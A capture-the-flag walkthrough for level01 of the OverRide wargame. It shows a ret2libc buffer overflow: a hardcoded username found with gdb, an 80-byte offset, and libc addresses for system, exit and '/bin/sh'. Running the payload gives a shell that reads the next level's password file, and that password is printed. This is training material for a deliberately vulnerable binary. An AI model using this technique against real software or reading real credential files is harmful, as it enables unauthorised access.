# level01 walkthrough

## the binary
``` shell
level01@OverRide:~$ ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: admin
verifying username....

nope, incorrect username...
```

## methodology
- ret2libc attack

The first step involves finding the correct username, which will allow us to log in. The username can be found in the `verify_user_name` function.
``` shell
(gdb) x/s 0x80486a8
0x80486a8:	 "dat_wil"
```

The `verify_user_pass` function provides a suspected password, but since it doesn't work directly, we won't focus on it.
``` shell
(gdb) x/s 0x80486b0
0x80486b0:	 "admin"
```

Since the binary is vulnerable to a buffer overflow, we can exploit this to perform a ret2libc attack:
1. offset = 80 bytes ([Wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator/))
2. address of `system` = 0xf7e6aed0
3. address of `exit` = 0xf7e5eb70
4. address of `/bin/sh` = 0xf7f897ec

Our payload is generated using an attached script.

## flag
``` shell
level01@OverRide:~$ python /tmp/payload01.py > /tmp/flag1
level01@OverRide:~$ cat /tmp/flag1 - | ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
